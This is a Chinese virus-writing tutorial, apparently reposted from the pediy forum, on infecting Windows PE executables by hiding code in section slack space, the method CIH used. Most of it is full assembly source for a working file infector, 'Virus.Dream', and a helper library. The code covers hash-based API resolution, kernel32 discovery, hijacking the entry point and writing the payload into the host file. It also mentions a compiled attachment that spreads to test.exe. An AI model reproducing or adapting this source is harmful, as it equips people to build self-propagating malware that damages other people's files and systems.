
# 1.4 - 3. 搜寻节空隙感染

> 原文：[`www.pediy.com/kssd/pediy10/91335.html`](https://www.pediy.com/kssd/pediy10/91335.html)

今天文章的主题是搜寻节空隙感染，我不想过多的去讲原理（例如为节中为何存在空隙.....，因为这些基础是要必须掌握的），搜寻节空隙感染在我们病毒中并不是很常用，因为无法断定被感染文件中存在的空隙大小是否大于我们的病毒体积，所以它的感染成功几率也要小的多。使用这类感染方式的病毒，典型的就是当年的“CIH”。

那么搜寻节空隙感染，最重要的就是找到我们节中存在的空隙。一般在病毒技术中，有两种方法。

1. 循环读取节表，然后分别在每个节中搜寻`00`机器码（因为默认编译器是用`00`机器码填充的），如果此`00`机器码区域的大小大于病毒的体积。则取这段区域的偏移。
2. 循环读取节表，通过节表结构中的物理文件大小 - 节映射大小取得节后面的物理空隙，然后判断此段空隙大小是否大于我们病毒体积，如果大于的话，则取这段区域的偏移。

另外还有将我们病毒分段插入，这需要依靠我们的反汇编引擎，将病毒代码拆解成多个过程，然后分别插入，最后将这些过程连接起来，同样这样也有很多弊端，所以很多时候这不能使我们产生动力...。

我们今天的代码使用的是第二种方法，因为第一种方法的弊端太多，例如如果被感染文件的空隙不是`00`机器码填充的等。为了稳定性还是选择第二种方法，虽然它的限制会比较多。实际上`CIH`利用的也是我们今天的第二种方法。

剩下我想就不用多解释了，我们直接看代码吧，因为它`Very Easy`。

代码:

```asm
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;   Virus.Dream  By: xfish
;
;   (c)2009-06-11
;       thanks www.pediy.com, www.hacker.com.cn
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

format   PE GUI 4.0
include 'win32ax.inc'
entry  Virus_Entry

.text

Virus_Entry:
    pushad
    call  Dels
      ;=======================================
Table:
         dd  038C62A7Ah
       _CreateFile  dd  0
         dd  09554EFE7h
       _GetFileSize  dd  0
         dd  00BE25545h
       _ReadFile  dd  0
         dd  0A9D1FD70h
       _SetFilePointer  dd  0
         dd  0C0D6D616h
       _CloseHandle  dd  0
         dd  0C2F6D009h
       _GlobalAlloc  dd  0
         dd  0585ED3CFh
       _GlobalFree  dd  0
         dd  058D8C545h
       _WriteFile  dd  0
         dd  0A412FD89h
       _LoadLibrary  dd  0
         dd  014D14C51h
       _MessageBox  dd  0
         rd  1

       szCaption  db  'Virus Dream - Demo', 0
       szText     db  'Oh Yeah of Virus Dream', 0
       szFileName  db  'test.exe', 0
       nWriteByteNum  dd  0
       ;========================================
Dels:
    pop  ebp

    call  GetKernel32

    push  ebp      ; pHashStringList = Tabel
    push  eax      ; hModule = Kernel32 Base
    call  GetFuncAddress

    push  '32'
    push  'user'
    push  esp      ; lpFileName = user32
    call  [ebp + (_LoadLibrary-Table)]
    pop  edx
    pop  edx

    push  ebp      ; pHashStringList = Tabel
    push  eax      ; hModule = user32 Base
    call  GetFuncAddress

    cmp  ebp, Dels - (Dels - Table)
    je  Inject

    push  0
    lea  edx, [ebp + (szCaption-Table)]
    push  edx
    lea  edx, [ebp + (szText-Table)]
    push  edx
    push  0
    call  [ebp + (_MessageBox-Table)]

    lea  eax, [ebp + (szFileName-Table)]
    push  eax
    call  Inject_File
    popad
    jmp  JmpHost

Inject:

    lea  eax, [ebp + (szFileName-Table)]
    push  eax
    call  Inject_File

    popad
    ret

;++
;
; int
;   Inject_File(
;   char * lpFileName
;   )
;
; Routine Description:
;
;   感染文件
;
; Arguments:
;
;    (esp+4*8+4)         - return address
;
; Return Value:
;
; nothing
;--
Inject_File:
    pushad
    lea  edx, [esp-8]
    call  .@@
      mov  esp, [esp+2*4]
      jmp  .Result
.@@:
    sub  eax, eax
    xchg  edx, [fs:eax]
    push  edx

    mov  edx, [esp+4*8+4+4*2]  ; edx = lpFileName
    push  eax eax OPEN_EXISTING eax FILE_SHARE_WRITE (GENERIC_READ or GENERIC_WRITE)
    push  edx
    call  [ebp + (_CreateFile-Table)]
    cmp  eax, -1
    je  .Result
    xchg  eax, ebx    ; ebx = FileHandle

    push  0
    push  ebx
    call  [ebp + (_GetFileSize-Table)]

    push  eax      ; [esp] = File Size

    push  eax
    push  GMEM_ZEROINIT
    call  [ebp + (_GlobalAlloc-Table)]
    xchg  eax, edi

    push  0
    push  esp
    push  dword [esp+4*2]    ; File Size = [esp]
    push  edi
    push  ebx
    call  [ebp + (_ReadFile-Table)]

            ; Del [esp]
    pop  [ebp + (nWriteByteNum-Table)]

            ; Test File Is Pe File
    push  edi
    call  IsPe
    jnc  .Free
            ; Get SectionTable Offset
    push  edi
    call  GetSectionTable
    xchg  eax, esi    ; esi = Section Table Offset

    push  edi
    call  GetSectionNum    ; ecx = Section Num
    jecxz  .Free

.LoopScas:
    mov  edx, [esi + PE_SECTION_STRUCT.se_physsize]
    sub  edx, [esi + PE_SECTION_STRUCT.se_virtsize]
    cmp  edx, Virus_Len
    jg  .MoveVirus
    add  esi, sizeof.PE_SECTION_STRUCT
    loop  .LoopScas
    jmp  .Free

.MoveVirus:
            ; Write EntryPointVa - JmpHost
    push  edi
    call  GetEntryPointVa
    mov  [ebp + (JmpHost - Table) + 1], eax

            ; Set New EntryPointRva
    mov  edx, [esi + PE_SECTION_STRUCT.se_virtsize]
    add  edx, [esi + PE_SECTION_STRUCT.se_virtrva]
    mov  eax, edi
    add  eax, [edi + MZ_STRUCT.mz_peptr]
    mov  [eax + PE_STRUCT.pe_entrypointrva], edx

            ; Set Section flags
    or  [esi + PE_SECTION_STRUCT.se_flags], 0E0000020h

            ; edx = Section date  Offset
    mov  edx, [esi + PE_SECTION_STRUCT.se_virtsize]
    add  edx, [esi + PE_SECTION_STRUCT.se_physoffs]
    add  edx, edi
            ; Move Virus Data
    pushad
    lea  esi, [ebp-6]
    mov  ecx, Virus_Len
    mov  edi, edx
    cld
    rep  movsb
    popad

    push  FILE_BEGIN
    push  0
    push  0
    push  ebx
    call  [ebp + (_SetFilePointer-Table)]

    push  0
    push  esp
    push  [ebp + (nWriteByteNum-Table)]
    push  edi
    push  ebx
    call  [ebp + (_WriteFile-Table)]

.Free:
    push  ebx
    call  [ebp + (_CloseHandle-Table)]

    push  edi
    call  [ebp + (_GlobalFree-Table)]

.Result:
    sub  eax, eax
    pop  dword [fs:eax]
    pop  edx
    popad
    retn  4*1

;++
JmpHost:
   push  $
   retn
;--

include  'useful.inc'

Virus_Len = $ - Virus_Entry
```

大家注意看可能会看到我`include`了一个`useful`的头文件，这个头文件中我封装了一些病毒中常用的函数，在这里也分享给大家。

`; useful.inc`

引用:

```asm
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;        Virus.Library        By: xfish
;
;
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

include 'pe.inc'

;++
;
; CF
;   IsPe(
;    pByte pMemory
;   )
;
; Routine Description:
;
;    测试是否是 PE 文件
;
; Arguments:
;
;   (esp)   - return address
;
;   [esp+4] - pMemory
;
; Return Value:
;
;    CF = 1
;    CF = 0
;--
IsPe:
       mov        edx, [esp+4]
       cmp        word [edx], 'MZ'
       jnz        .RetFalse
       add        edx, [edx+3ch]
       cmp        word [edx], 'PE'
       jnz        .RetFalse
.RetTrue:
       stc
       retn        4*1
.RetFalse:
        clc
        retn        4*1
;++
;
; int
;   GetSectionTable(
;    pByte pMemory
;   )
;
; Routine Description:
;
;    获取节表 Physical offset
;
; Arguments:
;
;   (esp)   - return address
;
;   [esp+4] - pMemory
;
; Return Value:
;
;   eax - Physical offset
;--
GetSectionTable:
       mov        eax, [esp+4]
       add        eax, dword [eax+MZ_STRUCT.mz_peptr]
       movzx        edx, word [eax+PE_STRUCT.pe_ntheadersize]
       lea        eax, [eax+edx+4*6]
       retn        4*1
;++
;
; int
;   GetEntryPointVa(
;    pByte pMemory
;   )
;
; Routine Description:
;
;    获取 oep Va Address
;
; Arguments:
;
;   (esp)   - return address
;
;   [esp+4] - pMemory
;
; Return Value:
;
;   eax - oep Va Address
;--
GetEntryPointVa:
```



```
     mov        eax, [esp+4]  

     add        eax, dword [eax+MZ_STRUCT.mz_peptr]  

     mov        edx, dword [eax+PE_STRUCT.pe_entrypointrva]  

     add        edx, dword [eax+PE_STRUCT.pe_imagebase]  

     xchg       edx, eax  

     retn        4*1  

 ;++  

 ;  

 ; int  

 ;   GetSectionNum(  
 ;    pByte pMemory  
 ;   )  
 ;  

 ; Routine Description:  
 ;  
 ;    获取节表数量  
 ;  
 ; Arguments:  
 ;  
 ;   (esp)   - return address  
 ;  
 ;   [esp+4] - pMemory  
 ;  
 ; Return Value:  
 ;  
 ;   ecx - Section Num  
 ;--  
 GetSectionNum:  

     mov        eax, [esp+4]  

     add        eax, [eax+MZ_STRUCT.mz_peptr]  

     movzx       ecx, word [eax+PE_STRUCT.pe_sectionnum]  

     retn        4*1  

 ;++  

 ;  

 ; int  
 ;   GetKernel32(  
 ;   )  
 ;  
 ; Routine Description:  
 ;  
 ;   获取 kernel32 基地址  
 ;  
 ; Arguments:  
 ;  
 ;    (esp)          - return address  
 ;  
 ; Return Value:  
 ;  
 ;    eax - kernel32 base  
 ;  
 ;--  
GetKernel32:  

        push    esi   
        xor    esi, esi   

;取 NT_TIB 结构 

        mov    esi, [fs:esi+18h]    

        lodsd   

;eax - StackBase 

        lodsd 

        mov    eax, [eax\-0x1c] 

 .NextCalc: 

        dec    eax 

        xor    ax, ax 

        cmp    word [eax], 'MZ' 

        jne    .NextCalc  

        pop    esi 

        retn 

 ;++  

 ;  

 ; void  
 ;   GetFuncAddress  
 ;    int hModule,  
 ;    int pHashStringList  
 ;   )  
 ;  
 ; Routine Description:  
 ;  
 ;   获取 Hash API 地址  
 ;  
 ; Arguments:  
 ;  
 ;    (esp)          - return address  
 ;    (esp+4*8+4)    - hModule  
 ;    (esp+4*8+8)    - pHashStringList  
 ;  
 ; Return Value:  
 ;  
 ;    nothing  
 ;  
 ;--  
 GetFuncAddress:  

        pushad  

        mov        ebx, [esp+4*8+4]           

        mov        edx, [ebx+3ch]                 

        mov        esi, [ebx++edx+78h]            

        lea        esi, [esi+ebx+18h]            

        lodsd  

        xchg       eax, ecx  

        lodsd  

        add        eax, ebx  

        xchg       eax, ebp                  

        lodsd  

        add        eax, ebx                 

        xchg       eax, edx                 

        lodsd  

        add        eax, ebx  

        push       eax                         

        mov        esi, edx  

 .Next_Func:  

         lodsd  

         add        eax, ebx  

         ; Make Func Hash  

         xor     edx, edx  

 .Make_Hash:  

          rol        edx, 3  

          xor     dl, byte [eax]  

        inc     eax  

        cmp     byte [eax], 0  

        jnz        .Make_Hash  

        mov     eax, [esp]  

        add        dword [esp], 2  

        mov        edi, [esp+4*8+8+4]  

 .Scan_Dw_Funcs:  

        cmp        dword [edi], edx  

        jnz        .Next_List  

        movzx       eax, word [eax]  

        mov        eax, [ebp+eax*4]  

        add        eax, ebx  

        scasd  

        stosd  

        jmp        .Ret  

 .Next_List:  

        scasd  

        scasd  

        cmp        dword [edi], 0  

        jne        .Scan_Dw_Funcs  

 .Ret:  

        loop     .Next_Func  

        pop        ecx  

        popad  

        retn          4*2 
```

最后附件中为文章中的代码和编译后的程序。另外还有一个 `test.exe`，为我们的测试被感染文件，这个文件本身是运行一个 `cmd` 窗口，感染完成后我们会发现它会弹出一个消息框，并继续感染当前目录下的`test.exe`程序，以及跳回原程序入口去运行一个 `cmd` 窗口。

`ps`：论坛程序用 `ubb` 的话，总是对不齐。

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `Virus_Dream.rar` `[解压密码：pediy]`   
|
